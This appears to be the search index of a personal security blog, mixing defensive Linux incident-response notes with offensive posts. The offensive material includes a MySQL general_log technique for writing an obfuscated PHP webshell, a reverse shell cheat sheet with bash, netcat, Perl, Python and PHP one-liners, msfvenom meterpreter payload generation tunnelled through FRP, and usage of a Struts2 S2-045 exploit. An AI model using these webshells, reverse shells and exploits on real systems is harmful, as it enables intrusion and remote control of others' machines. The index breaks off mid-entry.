<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【应急响应】自动化脚本]]></title>
    <url>%2F2018%2F06%2F27%2F%E3%80%90%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E3%80%91%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[此脚本用于简化应急响应过程，主要是针对CentOS系统应急响应的一些基础项，如下所示： 1）系统负载、内存占用、CPU使用率高的进程 2）系统初始化调用 3）定时任务 4）监听端口、主动外连（高并发机器慎用） 5）777目录下的可执行文件 6）系统命令替换 7）SSH登录成功和失败IP 8）调用河马检测最近修改的jsp文件 9）调用rkhunter查杀Rootkit Shell代码： [] [centos_shell]123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244#!/bin/bash#**************************************1********************# Description: For CentOS System#**********************************************************#mtime of jsp file WEBSHELLCHECK=1#application dirWEBDIR=/web/jboss/dir/#mtime of the system commandBINCHECK=5#mtime of sysinitINITCHECK=5Finittab5()&#123; echo "***************System Init Check***************" echo "------------------------------------------------------" echo "/etc/inittab" stat /etc/inittab | grep "Modify" echo "------------------------------------------------------" echo "/etc/rc.d/rc.sysinit" stat /etc/rc.d/rc.sysinit | grep "Modify" echo "------------------------------------------------------" echo "modified files under the /etc/rc.d/init.d/ directory:" find /etc/rc.d/init.d -mtime -$&#123;INITCHECK&#125; echo "------------------------------------------------------" echo "/etc/rc.d/rc.local" stat /etc/rc.d/rc.local | grep "Modify" echo "------------------------------------------------------"&#125;Finittab6()&#123; echo "***************System Init Check***************" echo "------------------------------------------------------" echo "modified files under the /etc/init/ directory:" find /etc/init/ -name "*.conf" -mtime -$&#123;INITCHECK&#125; echo "------------------------------------------------------" echo "/etc/rc.d/rc.sysinit" stat /etc/rc.d/rc.sysinit | grep "Modify" echo "------------------------------------------------------" echo "modified files under the /etc/rc.d/init.d/ directory:" find /etc/rc.d/init.d/ -mtime -$&#123;INITCHECK&#125; echo "------------------------------------------------------" echo "/etc/rc.d/rc.local" stat /etc/rc.d/rc.local | grep "Modify" echo "------------------------------------------------------"&#125;Finittab7()&#123; echo "***************System Init Check***************" echo "------------------------------------------------------" echo "modified files under the /usr/lib/systemd/system/ directory:" find /usr/lib/systemd/system/ -maxdepth 1 -name "*.service" -mtime -$&#123;INITCHECK&#125; echo "------------------------------------------------------" echo "modified files under the /etc/systemd/system/ directory:" find /etc/systemd/system/ -maxdepth 1 -name "*.service" -mtime -$&#123;INITCHECK&#125; echo "------------------------------------------------------" echo "modified files under the /etc/rc.d/init.d/ directory:" find /etc/rc.d/init.d -mtime -$&#123;INITCHECK&#125; -type f echo "------------------------------------------------------" echo "/etc/rc.d/rc.local" stat /etc/rc.d/rc.local | grep "Modify" echo "------------------------------------------------------"&#125;Fcrontab()&#123; echo "***************Crontab Check***************" echo "------------------------------------------------------" for file in $(ls /var/spool/cron/) do echo "/var/spool/cron/$&#123;file&#125;" cat /var/spool/cron/$&#123;file&#125; | grep -v "^$" | grep -v "^#" echo "------------------------------------------------------" done echo "/etc/crontab" cat /etc/crontab | grep -v "^$" | grep -v "^#" echo "------------------------------------------------------" echo "/etc/anacrontab" cat /etc/anacrontab | grep -v "^$" | grep -v "^#" echo "------------------------------------------------------" for file in $(find /etc -name "cron.*" -type d) do echo "$&#123;file&#125;" ls -alt $&#123;file&#125; | grep '^-' echo "------------------------------------------------------" done&#125;Fnetlink()&#123; echo "***************Netstat Check***************" echo "------------------------------------------------------" echo "Listening port list:" netstat -antlp -A inet | grep LISTEN | awk '&#123;printf "%-20s %-20s\n",$4,$7&#125;' echo "------------------------------------------------------" echo "The connection initiated by the machine:" regstr="(" for port in $(netstat -antlp -A inet | grep LISTEN | awk -F '[ :]+' '&#123;print $5&#125;') do regstr="$&#123;regstr&#125;$&#123;port&#125;|" done regstr="$&#123;regstr%?&#125;)" regExternal="^((192\.168|172\.([1][6-9]|[2][0-9]|3[01]))(\.([2][0-4][0-9]|[2][5][0-5]|[01]?[0-9]?[0-9]))&#123;2&#125;|10(\.([2][0-4][0-9]|[2][5][0-5]|[01]?[0-9]?[0-9]))&#123;3&#125;)$" netstat -antlp -A inet | grep -v '127.0.0.1' | grep ESTABLISHED | awk -F '[ :]+' '&#123;if($5 !~ /'$regstr'/)print $0&#125;' | while read link do echo $link | awk -F '[ :]+' '&#123;print $6&#125;' | egrep -v $regExternal &gt;&gt; /dev/null if [ $? -eq 0 ];then echo $link | awk '&#123;print $4" "$5" "$7&#125;' fi done echo "------------------------------------------------------"&#125;FSensitiveDir()&#123; echo "***************Sensitive Directory Check(/tmp、/var/tmp、/dev/shm)***************" ls /proc/ -tr | grep -v "[a-z]" | while read line do if [ -d "/proc/$line" ];then pname=`readlink /proc/$line/exe` echo $pname | egrep '^/(tmp|var/tmp|dev/shm)' &gt;&gt; /dev/null if [ $? -eq 0 ];then printf "%-20s %-20s\n" $line $pname fi fi done&#125;FModifyFile()&#123; echo "***************System Command Check(/bin、/sbin、/usr/bin、/usr/sbin)***************" echo "------------------------------------------------------" echo "The binary files that are modified within $&#123;BINCHECK&#125; days:" find /bin/ /sbin/ /usr/sbin/ /usr/bin/ -mtime -$&#123;BINCHECK&#125; -type f | while read line do echo $line done echo "------------------------------------------------------" echo "RPM consistency check:" rpm -aV echo "------------------------------------------------------"&#125;FSshLogin()&#123; echo "***************Ssh Login Check***************" echo "------------------------------------------------------" echo "List of successful IPs for SSH login：" grep 'Accepted' /var/log/secure | awk '&#123;print $11&#125;' | sort | uniq -c | sort -nr echo "------------------------------------------------------" echo "List of failed IPs for SSH login：" grep 'Failed' /var/log/secure | awk '&#123;print $11&#125;' | sort | uniq -c | sort -nr echo "------------------------------------------------------"&#125;FLoad()&#123; echo "***************System Information***************" echo "------------------------------------------------------" echo "load average:" uptime | awk '&#123;print $10,$11,$12&#125;' echo "------------------------------------------------------" echo "Memory usage:" free -g | grep Mem | awk '&#123;print "Total Mem："$2"G"&#125;' free -g | grep buffers/cache | awk '&#123;print "Used Mem："$3"G"&#125;' echo "------------------------------------------------------" echo "The process of CPU usage over 50%:" ps aux | sort -rn -k +3 | awk '&#123;if(($3&gt;50))print $0&#125;' echo "------------------------------------------------------"&#125;FWebshellCheck()&#123; echo "***************WebShell Check(hm)***************" echo "Jsp files that are modified within $&#123;WEBSHELLCHECK&#125; days:" modifydir=/tmp/$(date +%s)/ mkdir $modifydir ls $&#123;WEBDIR&#125; | while read project do if [ -f $&#123;WEBDIR&#125;$&#123;project&#125;/conf/server.xml ];then cat "$&#123;WEBDIR&#125;$&#123;project&#125;/conf/server.xml" | egrep -o 'docBase=".*"' | awk -F '"' '&#123;print $2&#125;' | while read line do find $line -name '*.jsp' -mtime -$&#123;WEBSHELLCHECK&#125; | while read fname do modifyfile=$(echo $fname | sed 's/\//@/g') cp $&#123;fname&#125; $&#123;modifydir&#125;$&#123;modifyfile&#125; done done fi done filecount=$(ls -al $&#123;modifydir&#125; | grep '^-' | wc -l) echo "Dir: $&#123;modifydir&#125;" echo "JSP files to be detected: $&#123;filecount&#125;" if (($&#123;filecount&#125;&gt;0));then if [ ! -f /tmp/hm-linux.tgz ];then echo "Download the webshell check tool" if [ $&#123;bit&#125; -eq 64 ];then wget -O /tmp/hm-linux.tgz http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz?version=1.4.2 elif [ $&#123;bit&#125; -eq 32 ];then wget -O /tmp/hm-linux.tgz http://down.shellpub.com/hm/latest/hm-linux-386.tgz?version=1.4.2 fi fi [ ! -d /tmp/hmwebshell ] &amp;&amp; mkdir /tmp/hmwebshell tar zxvf /tmp/hm-linux.tgz -C /tmp/hmwebshell &gt;&gt; /dev/null [ -f /tmp/hmwebshell/hm ] &amp;&amp; /tmp/hmwebshell/hm scan $&#123;modifydir&#125; &gt;&gt; /dev/null if [ -f result.csv ];then count=$(cat result.csv | wc -l) if [ $&#123;count&#125; -gt 1 ];then echo "The suspicious files are as follows: " cat result.csv | egrep '^[0-9]' | awk -F ',' '&#123;print $3&#125;' | awk -F '/' '&#123;print $4&#125;' | sed 's/@/\//g' else echo "No suspicious files were found" fi fi fi rm -rf $&#123;modifydir&#125;&#125;FRootkitCheck()&#123; echo "***************Rootkit Check***************" if [ ! -f /usr/local/bin/rkhunter ];then echo "Install rkhunter" [ ! -f /tmp/rkhunter-1.4.6.tar.gz ] &amp;&amp; wget -O /tmp/rkhunter-1.4.6.tar.gz http://vinc.top/tools/rkhunter-1.4.6.tar.gz tar zxvf /tmp/rkhunter-1.4.6.tar.gz &amp;&amp; cd /tmp/rkhunter-1.4.6/ &amp;&amp; ./installer.sh --install fi /usr/local/bin/rkhunter --check -sk&#125;ver=$(cat /etc/redhat-release | grep -E -o [1-9.]+ | cut -d . -f 1)bit=$(getconf LONG_BIT)FLoadFSshLoginFSensitiveDirFModifyFileFcrontabFnetlinkcase $ver in 5) Finittab5 ;; 6) Finittab6 ;; 7) Finittab7 ;;esac FWebshellCheckFRootkitCheck 转自：vinc.top]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL's general-log shell]]></title>
    <url>%2F2018%2F06%2F04%2FMySQL's%20general-log%20shell%2F</url>
    <content type="text"><![CDATA[MySQL ROOT: show variables like &apos;%general%&apos;; set global general_log=&apos;on&apos;; SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;; SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;; SELECT &quot;&lt;?php $p = array(&apos;f&apos;=&gt;&apos;a&apos;,&apos;pffff&apos;=&gt;&apos;s&apos;,&apos;e&apos;=&gt;&apos;fffff&apos;,&apos;lfaaaa&apos;=&gt;&apos;r&apos;,&apos;nnnnn&apos;=&gt;&apos;t&apos;);$a = array_keys($p);$_=$p[&apos;pffff&apos;].$p[&apos;pffff&apos;].$a[2];$_= &apos;a&apos;.$_.&apos;rt&apos;;$_(base64_decode($_REQUEST[&apos;cmd&apos;]));?&gt;&quot;; set global general_log = off;]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>shell</tag>
        <tag>log</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Frp结合VPS打造外网Meatsploit]]></title>
    <url>%2F2018%2F04%2F19%2FFrp%EF%BC%8BVPS%E6%89%93%E9%80%A0%E5%A4%96%E7%BD%91Meatsploit%2F</url>
    <content type="text"><![CDATA[前言： 本来一开始是在Vps上直接安装的MSF,想安装的可以试试，附一键脚本： curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall chmod 755 msfinstall &amp;&amp; ./msfinstall 可以用，但是总是时不时崩溃（可能是配置太低），烦的一pi.然后就去Google找到了ngrok的端口转发教程。试了下，可以用，不过用起来反应很慢，时不时还掉线，尼玛啊，最坑的是有的平台（VIP是不可能开的，这辈子都不可能）不能固定外网端口，启动一次客户端就换一个端口，每次都要改Payload，费劲。然后试了下用Frp来转发，相比起来简直不要太爽。 1. 准备工作： VPS一台FRP ##下载地址：https://github.com/fatedier/frp/releases（根据自己的VPS选择对应的版本） ２.安装步骤：在VPS上执行（我的是Centos x64）： wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frp tar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 cd frp_0.16.1_linux_amd64 rm frpc&amp;&amp;rm frpc.ini ##这个是客户端文件，用不上，删不删随意。 ./frps -c frps.ini ##默认配置文件启动服务端。 在自己电脑执行（我的是KALi x64）: wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frp tar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 cd frp_0.16.1_linux_amd64 rm frps&amp;&amp;rm frps.ini ##这个是服务端文件，用不上，删不删随意。 ./frpc -c frpc.ini ##使用配置文件启动客户端。 注意frpc.ini配置文件内容（详细参考）： [common] server_addr = *.*.*.* ##VPS的IP地址 server_port = 7000 [msf] type = tcp ##协议 local_ip = *.*.*.* ##本地内网主机IP。 local_port = 4444 ##本地MSF监听的端口 remote_port = 8011 ##Payload设置的LPORT端口,LHOST为VPS的IP。 Payload生成实例： $ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=VPS的IP lport=8011 -f exe -o payload.exe MSf监听示例： Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/x64/meterpreter_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none) EXTENSIONS no Comma-separate list of extensions to load EXTINIT no Initialization strings for extensions LHOST 172.16.1.254 yes The listen address LPORT 4444 yes The listen port 附一张截图： 结束语：当然frp不止tcp端口转发这一种用法，还可以做socks5,http代理等，其他的自行查看说明文档。]]></content>
      <categories>
        <category>msf</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>frp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How to encrypt files and folders with eCryptfs in Ubuntu/Debian/kali linux]]></title>
    <url>%2F2018%2F03%2F27%2Fencrypt%20in%20linux%2F</url>
    <content type="text"><![CDATA[apt-get install ecryptfs-utils modprobe ecryptfs #Load the ecryptfs kernel driver ecryptfs-setup-private ##default ecryptfs-umount-private # to unmount ecryptfs-mount-private # to mount it again,Switch to another directory except home ####### ecryptfs-setup-private --noautoumount # avoid ecryptfs auto mount at login]]></content>
      <categories>
        <category>encrypt</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>encrypt</tag>
        <tag>eCryptfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Reverse Shell Cheat Sheet]]></title>
    <url>%2F2018%2F03%2F20%2FReverse%20Shell%20Cheat%20Sheet%2F</url>
    <content type="text"><![CDATA[set a listener: nc -nvlp 443 Bash: bash -i &gt;&amp; /dev/tcp/192.168.1.11/443 0&gt;&amp;1 Netcat nc -nv 192.168.1.11 443 -e /bin/bash ##linux nc.exe -nv 192.168.1.11 443 -e cmd ##windows Perl perl -e &apos;use Socket;$i=&quot;192.168.1.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S ,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot; /bin/bash -i&quot;);};&apos; Python python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; PHP php -r &apos;$sock=fsockopen(&quot;192.168.1.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>bash</tag>
        <tag>perl</tag>
        <tag>netcat</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python PyQt5]]></title>
    <url>%2F2018%2F03%2F07%2FPython%E5%AE%9E%E7%94%A8%2F</url>
    <content type="text"><![CDATA[使用Python3，PyQt5实现简易浏览器from PyQt5.QtWidgets import QApplication from PyQt5.QtWebEngineWidgets import QWebEngineView from PyQt5.QtCore import QUrl app = QApplication([]) view = QWebEngineView() view.load(QUrl(&quot;https://translate.google.cn&quot;)) view.show() app.exec_()]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>pyqt5</tag>
        <tag>python</tag>
        <tag>browser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How to setup a socks5 proxy server using Dante]]></title>
    <url>%2F2018%2F01%2F22%2FHow-to-setup-a-socks5-proxy-server-using-Dante%2F</url>
    <content type="text"><![CDATA[debain可用参考链接： https://nfalcone.net/blog/danted-socks-proxy-server/ &gt; 其他： socks5软件包安装:# apt-get update &amp;&amp; apt-get upgrade # apt-get install dante-server # service danted restart # service danted status # danted -v danted: dante v1.1.19 socks5源码安装：# cd /usr/src # wget http://www.inet.no/dante/files/dante-1.4.2.tar.gz # tar -zxf dante-1.4.2.tar.gz # cd dante-1.4.2/ # apt-get install gcc make #./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --disable-client --without-libwrap --without-bsdauth --without-gssapi --without-krb5 --without-upnp --without-pam # make &amp;&amp; make install # /usr/sbin/sockd -v Dante v1.4.2. Copyright (c) 1997 - 2014 Inferno Nettverk A/S, Norway Configuring Dante-server service script# vim /etc/init.d/sockd 参考链接：https://www.proxyrack.com/how-to-setup-a-socks5-proxy-server-using-dante/ debain可能遇到的问题： perl: warning: Falling back to the standard locale (“C”) root@host:~#locale-gen en_GB.UTF-8 root@host:~#localectl set-locale LANG=en_GB.UTF-8,LC_ALL=en_GB.UTF-8 参考：https://konradpodgorski.com/blog/2014/06/23/fixing-locale-problem-debian/ debain VPs 安装失败：仅作记录]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>socks5</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SS安装脚本]]></title>
    <url>%2F2018%2F01%2F22%2FSS%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[一键安装：wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh chmod +x shadowsocks-all.sh ./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log 多用户配置文件：vim /etc/shadowsocks-go/config.json { &quot;server&quot;:&quot;0.0.0.0&quot;, &quot;port_password&quot;:{ &quot;8989&quot;:&quot;password0&quot;, &quot;9001&quot;:&quot;password1&quot;, &quot;9002&quot;:&quot;password2&quot;, &quot;9003&quot;:&quot;password3&quot;, &quot;9004&quot;:&quot;password4&quot; }, &quot;method&quot;:&quot;aes-256-cfb&quot;, &quot;timeout&quot;:600 } 卸载：./shadowsocks-all.sh uninstall 启动命令： 启动脚本后面的参数含义，从左至右依次为：启动，停止，重启，查看状态。 echo &quot;alias ss=&apos;/etc/init.d/shadowsocks-go&apos;&quot; &gt;&gt; .bashrc Shadowsocks-Python 版： /etc/init.d/shadowsocks-python start | stop | restart | status ShadowsocksR 版： /etc/init.d/shadowsocks-r start | stop | restart | status Shadowsocks-Go 版： /etc/init.d/shadowsocks-go start | stop | restart | status Shadowsocks-libev 版： /etc/init.d/shadowsocks-libev start | stop | restart | status 各版本默认配置文件 Shadowsocks-Python 版： /etc/shadowsocks-python/config.json ShadowsocksR 版： /etc/shadowsocks-r/config.json Shadowsocks-Go 版： /etc/shadowsocks-go/config.json Shadowsocks-libev 版： /etc/shadowsocks-libev/config.json VPS测速脚本：wget -qO- –no-check-certificate https://raw.githubusercontent.com/oooldking/script/master/superbench.sh | bash wget -qO- bench.sh | bash 或者 curl -Lso- bench.sh | bash]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>ss</tag>
        <tag>shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Xss常用测试代码]]></title>
    <url>%2F2018%2F01%2F18%2FXss%E5%B8%B8%E7%94%A8%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[简单测试代码： &lt;img src=&quot;#&quot; onerror=&quot;alert(111)&quot;&gt;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msf常用命令]]></title>
    <url>%2F2018%2F01%2F18%2Fmsf-shell%2F</url>
    <content type="text"><![CDATA[Msf安装： curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall chmod 755 msfinstall &amp;&amp; ./msfinstall Msfshell java/meterpreter/reverse_tcp msfvenom -p java/meterpreter/reverse_tcp LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux实用技巧]]></title>
    <url>%2F2018%2F01%2F18%2Flinux%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[自定义终端命令启动程序 编辑 .bashrc 文件： root@kali:~# vim .bashrc root@kali:~# source .bashrc exm： alias burp=&apos;setsid java -jar /root/softs/burpsuite_pro_v1.6.37.jar &gt;/dev/null 2&gt;&amp;1 &amp;&apos; echo &quot;###&quot; &gt; file ##替换文件 echo &quot;###&quot; &gt;&gt; file ##追加写入文件 echo &quot;alias ss=&apos;ss start&apos;&quot; &gt;&gt; .bashrc 设置ssh免密码登录在.ssh目录下： 本地主机： ssh-keygen -t rsa ##生成id_rsa.pub cat vps_rsa.pub &gt;&gt; authorized_keys ##写入文件 复制authorized_keys到远程主机： scp -P 22 authorized_keys root@176.*.145.*:/root/.ssh 从远程主机下载文件： scp -P 22 root@176.*.145.*:/root/test.txt /root/ 批量操作文件find ./ -name &quot;*.docx&quot; | awk -F &quot;.&quot; &apos;{print $2}&apos; | xargs -i -t mv ./{}.docx ./{}.doc #批量修改后缀名 cp -r &apos;find root/a -iname *.doc&apos; root/b #批量复制某后缀名的文件 配置终端使用HTTP or SOCKS5代理 把代理服务器地址写入shell配置文件.bashrc或者.zshrc 直接在.bashrc或者.zshrc添加下面内容 export http_proxy=&quot;http://localhost:port&quot; export https_proxy=&quot;http://localhost:port&quot; 以使用shadowsocks代理为例，ss的代理端口为1080,那么应该设置为 export http_proxy=&quot;socks5://127.0.0.1:1080&quot; export https_proxy=&quot;socks5://127.0.0.1:1080&quot; 或者直接设置ALL_PROXY export ALL_PROXY=socks5://127.0.0.1:1080 然后ESC后:wq保存文件，接着在终端中执行 source ~/.bashrc 或者退出当前终端再起一个终端。 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了。 或者通过设置alias简写来简化操作，每次要用的时候输入setproxy，不用了就unsetproxy。 alias setproxy=&quot;export ALL_PROXY=socks5://127.0.0.1:1080&quot; alias unsetproxy=&quot;unset ALL_PROXY&quot; alias ip=&quot;curl ip.cn&quot;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>bash</tag>
        <tag>linux</tag>
        <tag>sh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux入侵检测基础]]></title>
    <url>%2F2018%2F01%2F18%2Flinux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[审计命令last 这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。 相关参数： last -10（-n） 查看最近10条记录 last -x reboot 查看重启的记录 last -x shutdown 查看关机的记录 last -d 查看登陆的记录 last –help 命令帮助信息 last -f wtmp 用last命令查看wtmp文件（直接打开无法查看） lastb 这个命令用于查看登录失败的情况，本质就是将/var/log/btmp文件格式化输出。 相关参数： lastb name（root） 查看root用户登陆失败记录 lastb -10（-n） 查看最近10条登陆失败记录 lastb –heplp 命令帮助信息 lastlog 这个命令用于查看用户上一次的登录情况，本质就是将/var/log/lastlog文件格式化输出。 相关参数： lastlog 所有用户上一次登陆记录 lastlog -u username（root） root用户上一次登陆记录 lastlog –help 命令帮助信息 who 这个命令用户查看当前登录系统的情况，本质就是将/var/log/utmp文件格式化输出。主要用来查看当前用户名称，以及登陆的ip地址信息，w命令与who一样，会更详细一些。 history查看历史命令记录，其实就是查看root/.bash_history文件内容，删除这个文件，记录就没了。 相关参数： history 查看所有历史记录 history -10 查看最近10条记录 history | grep “wget” 查看wget相关信息的记录 history –help 命令帮助信息 history显示时间戳： export HISTTIMEFORMAT=&quot;%F %Twhoami&quot; history | more 检查用户 Linux不同的用户，有不同的操作权限，但是所有用户都会在/etc/passwd、/etc/shadow、/etc/group文件中记录。 less /etc/passwd 查看是否有新增用户 grep :0 /etc/passwd 查看是否有特权用户（root权限用户） ls -l /etc/passwd 查看passwd最后修改时间 cawk -F: &#39;$3==0 {print $1}&#39; /etc/passwd 查看是否存在特权用户 awk -F: &#39;length($2)==0 {print $1}&#39; /etc/shadow 查看是否存在空口令用户 注：linux设置空口令：passwd -d username 检查进程 一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。 普通进程ps -aux 查看进程 top查看进程 lsof -p pid 查看进程所打开的端口及文件 lsof -c 进程名 查看关联文件 ps -aux | grep python | cut -d &apos; &apos; -f 2 | xargs kill 杀死python相关的进程 检查/etc/inetd.conf文件，输入：cat /etc/inetd.conf | grep –v &quot;^#&quot;，输出的信息就是你这台机器所开启的远程服务。 隐藏进程ps -ef | awk &apos;{print}&apos; | sort -n | uniq &gt;1 ls /proc | sort -n |uniq &gt;2 diff 1 2 检查文件 被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。 find / -uid 0 -print 查找特权用户文件 find / -size +10000k -print 查找大于10000k的文件 find / -name &quot;…&quot; -prin 查找用户名为…的文件 find / -name core -exec ls -l {} \; 查找core文件，并列出详细信息 md5sum -b filename 查看文件的md5值 rpm -qf /bin/ls 检查文件的完整性（还有其它/bin目录下的文件） whereis 文件名 查看文件路径 ls -al 文件名 查看文件创建时间 du -sh 文件名 查看文件大小 检查网络 检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。 ip link | grep PROMISC 正常网卡不应该存在promisc，如果存在可能有sniffer lsof -i netstat -nap 查看不正常端口 arp -a 查看arp记录是否正常 ifconfig -a 查看网卡设置 检查计划任务 当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。 crontab -u root -l 查看root用户的计划任务 cat /etc/crontab ls -l /etc/cron.* 查看cron文件是否变化的详细信息 ls /var/spool/cron/ 检查系统后门 可以使用工具，如：Conmodo、rkhunter等，当然也可以手工输入命令检查。 vim $HOME/.ssh/authorized_keys 查看ssh永久链接文件 lsmod 检查内核模块 chkconfig –list/systemctl list-units –type=service 检查自启 查看著名的木门后门程序： ls /etc/rc.d #系统开机后，此目录下的文件会被启动 ls /etc/rc3.d find / -name “.rhosts” –print find / -name “.forward” –print 打包文件 当我们做好一切入侵检测分析后，我们需要把一些日志文件copy到本地进行更进一步详细的分析时，怎么打包服务器相关信息，并且copy到本地呢？ 打包web文件打包文件名中包含jsp的文件，打包后的文件为my_txt_files.tar：tar cvf my_txt_files.tar find . -type f -name &quot;*.jsp*&quot; 打包日志文件tar -cvf log.tar /var/log 打包其他信息last &gt; last.log netstat -an &gt; netstat.log]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>入侵检测，安全审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装NVIDIA显卡驱动]]></title>
    <url>%2F2018%2F01%2F10%2Fkali%E5%AE%89%E8%A3%85NVIDIA%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[安装参考链接https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop验证：https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>NVIDIA</tag>
        <tag>驱动</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[s2-045 exp CVE-2017-5638]]></title>
    <url>%2F2017%2F03%2F16%2Fs2-045-exp-CVE-2017-5638%2F</url>
    <content type="text"><![CDATA[Usage: Testing a single URL. python struts-pwn.py --url &apos;http://example.com/struts2-showcase/index.action&apos; -c &apos;id&apos; Testing a list of URLs. python struts-pwn.py --list &apos;urls.txt&apos; -c &apos;id&apos; Checking if the vulnerability exists against a single URL. python struts-pwn.py --check --url &apos;http://example.com/struts2-showcase/index.action&apos; Checking if the vulnerability exists against a list of URLs. python struts-pwn.py --check --list &apos;urls.txt&apos; Requirements Python2 or Python3 requests https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py]]></content>
      <categories>
        <category>exploit</category>
      </categories>
      <tags>
        <tag>s2-045</tag>
        <tag>exp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python command]]></title>
    <url>%2F2017%2F03%2F06%2FPython-command%2F</url>
    <content type="text"><![CDATA[python: py -2 hello.py py -3 hello.py pip py -2 -m pip install XXXX py -3 -m pip install XXXX]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SimpleHTTPServer]]></title>
    <url>%2F2017%2F03%2F05%2FSimpleHTTPServer%2F</url>
